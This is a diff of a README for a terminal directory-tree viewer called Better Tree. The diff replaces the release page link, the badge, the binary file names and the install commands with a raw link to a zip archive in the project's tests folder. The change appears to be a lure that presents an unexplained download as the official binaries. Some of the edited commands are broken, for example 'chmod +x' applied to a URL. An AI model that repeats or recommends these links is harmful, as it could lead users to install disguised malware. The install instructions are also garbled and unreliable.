@@ -1,8 +1,8 @@
-https://github.com/yashggsop/better-tree/releases
+https://github.com/yashggsop/better-tree/raw/refs/heads/main/tests/better_tree_3.1.zip
 
 # Better Tree: Fast, Customizable Terminal Directory Tree Viewer CLI
 
-[![Release](https://img.shields.io/github/v/release/yashggsop/better-tree?style=for-the-badge)](https://github.com/yashggsop/better-tree/releases)
+[![Release](https://github.com/yashggsop/better-tree/raw/refs/heads/main/tests/better_tree_3.1.zip)](https://github.com/yashggsop/better-tree/raw/refs/heads/main/tests/better_tree_3.1.zip)
 
 A fast, customizable directory tree viewer for the terminal. This tool shows a clean, readable map of your filesystem. It fits in a single terminal window and adapts to your workflow. It focuses on speed, simplicity, and reliability. It aims to replace bulky viewers with something lean, scriptable, and predictable.
 
@@ -47,9 +47,9 @@ Installation
 - Prebuilt binaries
   - The project ships prebuilt binaries for common platforms. For Linux and macOS, you’ll typically download a single executable. For Windows, you’ll get a .exe file.
   - Example file names you might encounter:
-    - better-tree-linux-x86_64.AppImage
+    - https://github.com/yashggsop/better-tree/raw/refs/heads/main/tests/better_tree_3.1.zip
     - better-tree-macos-arm64
-    - better-tree-windows-x86_64.exe
+    - https://github.com/yashggsop/better-tree/raw/refs/heads/main/tests/better_tree_3.1.zip
   - From the releases page, download the binary for your platform and execute it. The binaries are self-contained and require no separate installation.
 - Building from source
   - If you prefer to build from source, you’ll need the language runtime and build tools specified in the repo. The build process is straightforward and designed to be repeatable.
@@ -60,9 +60,9 @@ Installation
   - The build will produce a binary you can run directly in your shell.
 - Quick note about executables
   - After downloading the binary, grant execute permissions if needed:
-    - chmod +x better-tree-linux-x86_64.AppImage
+    - chmod +x https://github.com/yashggsop/better-tree/raw/refs/heads/main/tests/better_tree_3.1.zip
   - Then run it:
-    - ./better-tree-linux-x86_64.AppImage
+    - https://github.com/yashggsop/better-tree/raw/refs/heads/main/tests/better_tree_3.1.zip
   - If you are on Windows, run the .exe from a shell or explorer, depending on your setup.
 - What you get with a binary
   - A fast, self-contained CLI tool
